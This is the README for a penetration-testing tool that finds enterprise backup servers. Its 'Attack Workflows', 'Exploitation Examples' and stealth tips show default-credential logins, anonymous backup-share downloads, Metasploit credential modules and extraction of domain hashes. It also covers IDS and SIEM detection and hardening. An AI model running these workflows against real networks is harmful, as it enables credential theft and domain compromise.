# BackupSeek

## Overview
BackupSeek is a specialized reconnaissance tool designed to discover and enumerate backup infrastructure within internal networks. It identifies backup servers, management consoles, and storage systems across multiple vendors and platforms, providing critical intelligence for penetration testing and security assessments.

Backup systems are high-value targets in enterprise environments because they often contain:
- Domain administrator credentials
- Database backups with sensitive data
- Full system images
- Configuration backups
- Historical data archives

BackupSeek helps security professionals identify these critical assets quickly and assess their exposure.

## Features

### Backup System Discovery
- **Veeam Backup & Replication**: Industry-leading VM backup solution
- **Acronis Cyber Backup**: Cloud-integrated backup platform
- **Bacula**: Open-source enterprise backup system
- **Dell EMC Networker**: Enterprise backup and recovery
- **IBM Spectrum Protect** (TSM): Enterprise-grade backup
- **CommVault**: Unified data management platform
- **Veritas NetBackup**: Enterprise backup solution
- **Windows Server Backup**: Built-in Windows backup

### Web Interface Detection
- Veeam Enterprise Manager (port 9419)
- Veeam Cloud Connect (port 9401)
- Acronis Management Console
- Custom backup portals
- API endpoints

### Share Enumeration
- Backup share detection
- Common backup folder names
- SMB/CIFS backup repositories
- Network-attached storage (NAS)

### Detailed Reporting
- Port-based system identification
- Web interface URLs
- Backup share locations
- Exploitation recommendations
- JSON export for automation

## Installation

### Prerequisites
```bash
# Python 3.6 or higher
python3 --version

# Required Python packages
pip3 install requests

# Optional: SMB enumeration
# Linux
sudo apt install smbclient

# macOS
brew install samba
```

### Installation Steps
```bash
# 1. Clone or download the tool
cd /opt/tools
git clone <repository-url> backupseek
cd backupseek

# 2. Make executable
chmod +x backupseek.py

# 3. Test installation
./backupseek.py -h

# 4. Create test target list
echo "192.168.1.0/24" > targets.txt
```

## Usage

### Basic Usage
```bash
# Scan for all backup systems
./backupseek.py iplist.txt

# Full comprehensive scan
./backupseek.py iplist.txt --full

# Verbose output
./backupseek.py iplist.txt -v
```

### Vendor-Specific Scans
```bash
# Scan for Veeam only
./backupseek.py iplist.txt --veeam

# Scan for Acronis only
./backupseek.py iplist.txt --acronis
```

### Performance Tuning
```bash
# Fast scan (20 workers)
./backupseek.py iplist.txt -w 20

# Slow/careful scan
./backupseek.py iplist.txt -w 5 -t 10

# Timeout adjustment
./backupseek.py iplist.txt --timeout 5
```

### Command-Line Options
```
Positional Arguments:
  input_file           File containing IP addresses (one per line)

Optional Arguments:
  -h, --help          Show help message
  --full              Full scan (all backup systems and features)
  --veeam             Scan for Veeam Backup & Replication only
  --acronis           Scan for Acronis Cyber Backup only
  -w, --workers N     Number of concurrent workers (default: 10)
  -t, --timeout N     Connection timeout in seconds (default: 3)
  -v, --verbose       Verbose output (show negative results)
```

## Input File Format

### IP List File
```
# Backup subnet
192.168.10.50
192.168.10.51
192.168.10.52

# Data center backup servers
10.0.5.10
10.0.5.11

# Branch office
172.16.20.100
```

### Supported Formats
- One IP per line
- Comments with `#`
- Blank lines ignored
- CIDR notation NOT supported (use expansion tool first)

## Output Files

### backuplist.txt
Simple list of backup servers found:
```
192.168.10.50
192.168.10.51
10.0.5.10
```

### backup_details.txt
Comprehensive findings with exploitation notes:
```
================================================================================
BACKUPSEEK - Detailed Scan Results
Scan Date: 2025-10-13 16:30:00
================================================================================

================================================================================
Host: 192.168.10.50
================================================================================

Backup Systems Detected:
  • Veeam Backup & Replication (Confidence: high)
    Ports: 9392, 9393, 9401

Open Ports (5):
  • 9392 - Veeam Backup Service
  • 9393 - Veeam Data Mover
  • 9401 - Veeam Cloud Connect
  • 9419 - Veeam Backup Enterprise Manager
  • 6160 - Veeam vPower NFS

Web Interfaces:
  • https://192.168.10.50:9419 - Enterprise Manager

Backup Shares:
  • \\192.168.10.50\VeeamBackup
  • \\192.168.10.50\BackupRepository

Exploitation Notes:
  Veeam:
    - Default creds: administrator/password or admin/admin
    - Check Veeam database for credentials
    - Backup files may contain domain credentials
```

### backup_details.json
Machine-readable JSON format:
```json
[
  {
    "ip": "192.168.10.50",
    "open_ports": [9392, 9393, 9401, 9419, 6160],
    "identified_systems": [
      {
        "system": "Veeam Backup & Replication",
        "confidence": "high",
        "ports": [9392, 9393, 9401, 9419, 6160]
      }
    ],
    "web_interfaces": [
      {
        "type": "veeam_web",
        "url": "https://192.168.10.50:9419",
        "port": 9419,
        "status_code": 200,
        "component": "Enterprise Manager"
      }
    ],
    "backup_shares": ["VeeamBackup", "BackupRepository"],
    "status": "backup_found"
  }
]
```

## Backup Systems Detected

### Veeam Backup & Replication

**Ports**:
- 9392: Backup Service
- 9393: Data Mover Service
- 9394/9395: Veeam Agent
- 9401: Cloud Connect
- 9419: Enterprise Manager (web UI)
- 6160: vPower NFS Service
- 6162: Mount Server

**Web Interfaces**:
- Enterprise Manager: `https://server:9419`
- Cloud Connect Portal: `https://server:9401`

**Default Credentials**:
- `administrator` / `password`
- `admin` / `admin`
- Domain credentials often used

**Data Locations**:
- SQL Server database: VeeamBackup
- Config: `C:\ProgramData\Veeam\Backup`
- Repositories: Often on dedicated storage

### Acronis Cyber Backup

**Ports**:
- 9876: Acronis Backup Service
- 43234: Agent for Windows/Linux
- 44445: Management Server

**Web Interfaces**:
- Management Console: `https://server:9877` or `https://server:44445`

**Default Credentials**:
- Check vendor documentation (varies by version)
- Often domain credentials

**Data Locations**:
- Archive locations configured per-client
- Typically UNC paths or local storage

### Bacula

**Ports**:
- 9101: Bacula Director
- 9102: File Daemon
- 9103: Storage Daemon

**Configuration**:
- Linux: `/etc/bacula/`
- Director config: `bacula-dir.conf`
- Contains Director password

**Data Locations**:
- Configured in Storage Daemon settings
- Often `/var/lib/bacula/` or dedicated mount

### Dell EMC Networker

**Ports**:
- 7937: Dell Networker
- 7938: NSR Service
- 7939: Remote Exec

**Management**:
- Networker Management Console (NMC)
- Often on dedicated management server

**Credentials**:
- Administrator account
- Check Networker server registry/config

### IBM Spectrum Protect (TSM)

**Ports**:
- 1500: Server communication
- 1501: Scheduler
- 1581: Web client

**Management**:
- ISC (Integrated Solutions Console)
- Admin command line interface

**Credentials**:
- Admin credentials in registry
- Often integrated with enterprise authentication

### CommVault

**Ports**:
- 8400: CommCell communication
- 8401: Web console
- 8403: Firewall port

**Web Interface**:
- Command Center: `https://server:8401`

**Credentials**:
- Admin user defined during install
- Check SQL database for credential store

### Veritas NetBackup

**Ports**:
- 1556: vnetd (master server)
- 13701: bprd (request daemon)
- 13702: bpdbm (database manager)
- 13720: bpcd (client daemon)
- 13724: vopied (media)

**Management**:
- NetBackup Administration Console
- Web UI (newer versions)

**Credentials**:
- Master server credentials
- Often integrated with AD

## Attack Workflows

### Workflow 1: Initial Discovery
```bash
# 1. Identify all backup servers
./backupseek.py targets.txt --full -v > scan_output.txt

# 2. Review findings
cat backuplist.txt
cat backup_details.txt

# 3. Identify high-value targets
grep -i "veeam\|acronis" backup_details.txt

# 4. Extract web interfaces
grep "https://" backup_details.txt > web_targets.txt
```

### Workflow 2: Veeam Exploitation
```bash
# 1. Discover Veeam servers
./backupseek.py targets.txt --veeam

# 2. Access web interface
# Browse to: https://192.168.10.50:9419
# Try default: administrator/password

# 3. If web access successful:
# - Navigate to "Backup Repositories"
# - Identify repository servers
# - Note backup file locations

# 4. Database credential extraction (if SQL access)
# Connect to VeeamBackup SQL database
# Query [Credentials] table for encrypted passwords
```

### Workflow 3: Share Enumeration
```bash
# 1. Full scan with share detection
./backupseek.py targets.txt --full

# 2. Test share access
smbclient //192.168.10.50/VeeamBackup -N

# 3. List backup files
smbclient //192.168.10.50/VeeamBackup -N -c 'ls'

# 4. Download configuration backups
smbclient //192.168.10.50/VeeamBackup -N -c 'get configbackup.xml'

# 5. Analyze for credentials
grep -i "password\|credential" configbackup.xml
```

### Workflow 4: Credential Harvesting
```bash
# 1. Identify all backup systems
./backupseek.py targets.txt --full

# 2. For each Veeam server found:
# - Access SQL database VeeamBackup
# - Extract from [dbo].[Credentials] table
# - Decrypt using known methods

# 3. For each Bacula server found:
# - Access /etc/bacula/bacula-dir.conf
# - Extract Director password
# - Connect to Director: bconsole

# 4. For each accessible backup share:
# - Search for .bak, .vbk, .vib, .vrb files
# - Download and analyze with strings
# - Extract credentials from configs
```

## Exploitation Examples

### Example 1: Veeam Default Credentials
```bash
# 1. Discover Veeam server
./backupseek.py targets.txt --veeam
# Found: 192.168.10.50 - Veeam Backup & Replication

# 2. Access web interface
curl -k https://192.168.10.50:9419

# 3. Login with defaults
Username: administrator
Password: password

# 4. Navigate to restore points
# Download VM backups containing:
# - SAM/SYSTEM registry hives
# - NTDS.dit (domain database)
# - Credential Manager vaults
```

### Example 2: Bacula Configuration Extraction
```bash
# 1. Identify Bacula server
./backupseek.py targets.txt --full
# Found: 192.168.10.51 - Bacula

# 2. If SSH/SMB access to server:
cat /etc/bacula/bacula-dir.conf | grep -i "password"
# Output: Password = "MyDirectorPassword123"

# 3. Connect with bconsole
bconsole
# Enter Director password when prompted

# 4. List backup jobs
*list jobs

# 5. Restore sensitive files
*restore
# Select files: /etc/shadow, /var/www/config.php, etc.
```

### Example 3: Backup Share Access
```bash
# 1. Full scan with shares
./backupseek.py targets.txt --full
# Found: \\192.168.10.50\VeeamBackup

# 2. Test anonymous access
smbclient //192.168.10.50/VeeamBackup -N

# 3. If accessible, download backups
smb: \> ls
# Look for: *.vbk, *.vib, *.vrb, *.bak

# 4. Download config backup
smb: \> get SQLBackup_20250101.bak

# 5. Extract credentials from SQL backup
strings SQLBackup_20250101.bak | grep -i "password"
```

### Example 4: Acronis Exploitation
```bash
# 1. Find Acronis servers
./backupseek.py targets.txt --acronis
# Found: 192.168.10.52 - Acronis Cyber Backup

# 2. Access web console
https://192.168.10.52:44445

# 3. Check for default/weak credentials
# Try: admin/admin, administrator/password

# 4. If successful:
# - Navigate to "Machines" to see all backed up systems
# - Identify domain controllers, database servers
# - Access "Recovery" to download backups
# - Extract .tib files and mount with Acronis tools
```

## Integration with Other Tools

### With Nmap
```bash
# 1. Fast port discovery with Nmap
nmap -p 9392,9393,9401,9419,9876,44445,9101-9103 \
     192.168.10.0/24 -oG backup_ports.txt

# 2. Extract live hosts
grep "open" backup_ports.txt | cut -d' ' -f2 > backup_ips.txt

# 3. Detailed scan with BackupSeek
./backupseek.py backup_ips.txt --full
```

### With CrackMapExec
```bash
# 1. Discover backup servers
./backupseek.py targets.txt --full

# 2. Test credentials against backup shares
for ip in $(cat backuplist.txt); do
    crackmapexec smb $ip -u userlist.txt -p passlist.txt --shares
done

# 3. Access found shares
crackmapexec smb 192.168.10.50 -u admin -p 'P@ssw0rd' \
    --share VeeamBackup --get-file backup.vbk
```

### With Metasploit
```bash
# 1. Identify Veeam servers
./backupseek.py targets.txt --veeam

# 2. Use Metasploit modules
msfconsole
use auxiliary/scanner/veeam/veeam_backup_manager_auth_bypass
set RHOSTS file:backuplist.txt
run

# 3. Veeam credential extraction
use post/windows/gather/credentials/veeam_backup_manager
set SESSION 1
run
```

### With Impacket
```bash
# 1. Find backup servers with shares
./backupseek.py targets.txt --full
# Found: \\192.168.10.50\VeeamBackup

# 2. Use smbclient.py to access
smbclient.py domain/user:password@192.168.10.50

# 3. List and download
# use VeeamBackup
# ls
# get backup_file.vbk
```

## Detection & Defense

### Detection Signatures

**Network-Level Detection**:
```
# IDS Rule: Multiple backup port scans
alert tcp any any -> $HOME_NET any (
    msg:"Multiple Backup System Ports Scanned";
    flags:S;
    threshold:type threshold, track by_src, count 5, seconds 60;
    metadata:service backup-scan;
    sid:1000010;
)
```

**Log Analysis**:
```bash
# Veeam: Check event logs
# Application Log > Veeam Backup
# Look for:
# - Failed login attempts
# - Unusual restore operations
# - Configuration changes
# - Database access from unusual IPs

# Bacula: Check logs
grep "Failed auth" /var/log/bacula/bacula.log
grep "Connection from" /var/log/bacula/bacula.log

# General: Network connections to backup ports
netstat -ano | findstr "9392 9393 9419"
```

**SIEM Rules**:
```
# Multiple failed Veeam web logins
source_type = "veeam_web_access"
status = "failed"
count > 5 within 10 minutes
→ ALERT: Potential Veeam bruteforce

# Backup server accessed from unusual source
destination_port in [9392, 9393, 9419, 9876, 44445]
source_ip NOT IN [known_admin_ips]
→ ALERT: Unusual backup server access

# Backup file downloads
smb_share in ["VeeamBackup", "Backups", "Acronis"]
file_extension in [".vbk", ".vib", ".tib", ".bak"]
count > 10 within 1 hour
→ ALERT: Bulk backup file download
```

### Defense Measures

**Network Segmentation**:
```bash
# Isolate backup servers in dedicated VLAN
# Example firewall rules (iptables):

# Allow only management subnet to backup ports
iptables -A INPUT -p tcp --dport 9392 -s 192.168.200.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 9393 -s 192.168.200.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 9419 -s 192.168.200.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 9392:9419 -j DROP

# Block internet access from backup servers
iptables -A OUTPUT -o eth0 -d 0.0.0.0/0 -j DROP
iptables -A OUTPUT -o eth0 -d 192.168.0.0/16 -j ACCEPT
```

**Access Control**:
```powershell
# Restrict Veeam console access
# Set via Veeam Backup & Replication console:
# Options > Security > Access Control
# Add only authorized users/groups

# Disable default accounts
# SQL Server: VeeamBackup database
# Rename or disable 'sa' account

# Strong passwords
# All backup accounts should have 20+ character passwords
```

**Authentication Hardening**:
```bash
# Veeam: Enable MFA
# Backup & Replication > Options > Security
# Enable: Two-factor authentication

# Bacula: Console password complexity
# /etc/bacula/bacula-dir.conf
Console {
  Name = admin
  Password = "$(pwgen 32 1)"  # Generate strong password
}

# NetBackup: Use certificate-based auth
# Instead of username/password
```

**Monitoring & Alerting**:
```powershell
# Windows: Enable auditing on backup servers
auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
auditpol /set /category:"Object Access" /success:enable /failure:enable

# Monitor specific events:
# Event ID 4625: Failed logon
# Event ID 4624: Successful logon
# Event ID 5140: Network share accessed
# Event ID 4648: Explicit credential use

# Veeam: Enable syslog forwarding
# Send logs to SIEM for correlation
```

**Encryption**:
```bash
# Encrypt all backup files
# Veeam: Job settings > Storage > Advanced > Encryption
# Enable encryption with strong password (20+ chars)

# Encrypt backup traffic
# Use TLS/SSL for all backup connections
# Veeam: Options > Network Traffic > Encryption

# Acronis: Enable AES-256 encryption
# In backup plan settings

# Bacula: Enable TLS
# In bacula-dir.conf, bacula-sd.conf, bacula-fd.conf
```

**Least Privilege**:
```powershell
# Backup service accounts should NOT be Domain Admins
# Create dedicated backup service account with minimal rights:
# - Read access to files/folders to backup
# - Write access to backup repository only
# - No interactive logon rights

# Veeam: Use different accounts for different roles
# - Backup proxy account (file access)
# - Repository account (storage access)
# - Web UI account (management only)
```

## Troubleshooting

### Common Issues

**"No backup systems detected"**
```bash
# Verify target is reachable
ping 192.168.10.50

# Check specific ports manually
nmap -p 9392,9393,9419 192.168.10.50

# Increase timeout
./backupseek.py targets.txt --timeout 10

# Try verbose mode
./backupseek.py targets.txt -v
```

**"Connection timeout"**
```bash
# Firewall may be blocking
# Test with telnet/nc
telnet 192.168.10.50 9392

# Increase timeout
./backupseek.py targets.txt -t 10

# Reduce worker count
./backupseek.py targets.txt -w 5
```

**"Web interface not detected"**
```bash
# Try manual access
curl -k https://192.168.10.50:9419

# Check SSL certificate
openssl s_client -connect 192.168.10.50:9419

# Some systems use HTTP instead
curl http://192.168.10.50:9419
```

**"No backup shares found"**
```bash
# Verify smbclient is installed
which smbclient

# Test manually
smbclient -L //192.168.10.50 -N

# May require credentials
smbclient -L //192.168.10.50 -U domain\\user

# Check network connectivity
nmap -p 139,445 192.168.10.50
```

**"SSL Certificate Verification Failed"**
```bash
# Already disabled in code, but if issues persist:
# Upgrade requests library
pip3 install --upgrade requests urllib3

# Check Python version
python3 --version  # Should be 3.6+
```

## Security Considerations

### For Penetration Testers
- **Authorization**: Ensure written permission before scanning
- **Scope**: Verify backup systems are in scope
- **Impact**: Be aware backup scans can trigger alerts
- **Documentation**: Record all accessed systems and data
- **Data Handling**: Securely handle any extracted credentials

### For Defenders
- **Asset Inventory**: Know all backup systems in environment
- **Hardening**: Follow vendor security guidelines
- **Monitoring**: Alert on unusual access patterns
- **Segmentation**: Isolate backup infrastructure
- **Testing**: Regularly test backup security controls

## Tips & Tricks

### 🎯 Targeting
- **Look for dedicated backup subnets**: Often 192.168.X.0/24
- **Check DNS records**: backup, veeam, acronis, bacula hostnames
- **Scan after hours**: Backup jobs typically run at night
- **Follow the data**: Database servers often have backup agents

### 🔍 Reconnaissance
- **Port scanning first**: Use Nmap for quick discovery
- **Web interface search**: Shodan/Censys for exposed consoles
- **DNS enumeration**: `dig backup.company.com ANY`
- **OSINT**: Job postings mentioning Veeam, Acronis, etc.

### 🔒 Stealth
- **Slow scans**: `-w 5 -t 10` for low-and-slow
- **Off-hours**: Scan during backups (noise cover)
- **Legitimate ports**: Backup traffic is expected, blend in
- **Avoid alerts**: Don't attempt web logins without valid creds

### ⚡ Speed
- **High workers**: `-w 50` for large networks
- **Targeted scans**: Use `--veeam` or `--acronis` if known
- **Port reduction**: Scan only primary ports (9392, 9876, 9101)
- **Nmap first**: Pre-filter with fast Nmap scan

### 🎓 Learning
- **Lab setup**: Install Veeam, Acronis trial versions
- **Read docs**: Each backup vendor has security guides
- **Exploit-DB**: Search for known vulnerabilities
- **Attend trainings**: Vendor certifications teach architecture

## Real-World Examples

### Example 1: Large Enterprise
```bash
./backupseek.py /tmp/all_servers.txt --full -w 50
# Scanned: 5,000 servers
# Found: 24 backup servers
#   - 12 Veeam
#   - 6 NetBackup
#   - 4 CommVault
#   - 2 Bacula
# Web Interfaces: 15
# Backup Shares: 32
# Time: ~45 minutes
```

### Example 2: Default Credentials
```bash
./backupseek.py targets.txt --veeam
# Found: 192.168.10.50 - Veeam Backup & Replication
# Tested: administrator/password → SUCCESS
# Result: Full access to all backups
# Impact: Downloaded domain controller backup
#         Extracted NTDS.dit
#         Cracked all domain hashes
```

### Example 3: Backup Share Compromise
```bash
./backupseek.py targets.txt --full
# Found: \\192.168.10.51\Backups (anonymous access)
# Downloaded: SQL_BACKUP_PROD_20250113.bak
# Extracted: Application connection strings
# Result: Database credentials recovered
# Impact: Access to production databases
```

### Example 4: Bacula Misconfiguration
```bash
./backupseek.py targets.txt --full
# Found: 192.168.10.52 - Bacula
# Accessed: /etc/bacula/ via misconfigured SMB share
# Extracted: Director password from bacula-dir.conf
# Result: Full backup catalog access
# Impact: Restored /etc/shadow from all Linux servers
```

## Advanced Techniques

### Custom Port Scanning
```python
# Modify BACKUP_PORTS dictionary in backupseek.py
BACKUP_PORTS = {
    8080: 'Custom Backup Web',
    50000: 'Proprietary Backup',
    # Add custom ports
}
```

### API Integration
```python
# Use JSON output for automation
import json

with open('backup_details.json', 'r') as f:
    results = json.load(f)

for server in results:
    if server['status'] == 'backup_found':
        print(f"Testing: {server['ip']}")
        for web in server['web_interfaces']:
            # Automated credential testing
            test_web_login(web['url'])
```

### Credential Extraction
```bash
# After identifying Veeam server
# Extract from SQL Server database

# Connect to VeeamBackup database
sqlcmd -S VEEAM-SERVER -d VeeamBackup

# Query credentials table
SELECT * FROM [dbo].[Credentials]

# Decrypt using Veeam decryption tools
# (requires Domain Admin or local admin on Veeam server)
```

## References
- **Veeam**: https://helpcenter.veeam.com/
- **Acronis**: https://www.acronis.com/en-us/support/documentation/
- **Bacula**: https://www.bacula.org/documentation/documentation/
- **Dell EMC Networker**: https://www.dell.com/support/home/en-us/product-support/product/networker/docs
- **IBM Spectrum Protect**: https://www.ibm.com/docs/en/spectrum-protect
- **MITRE ATT&CK**: T1005 (Data from Local System), T1213 (Data from Information Repositories)
- **CWE-798**: Use of Hard-coded Credentials
- **Backup Security Best Practices**: NIST SP 800-209

## License
This tool is for authorized security testing only. Unauthorized access to backup systems is illegal.

## Changelog
- **v1.0**: Initial release with support for 8 major backup platforms

---

**Remember**: Backup systems contain the keys to the kingdom. Handle with care, and always operate within your authorized scope.
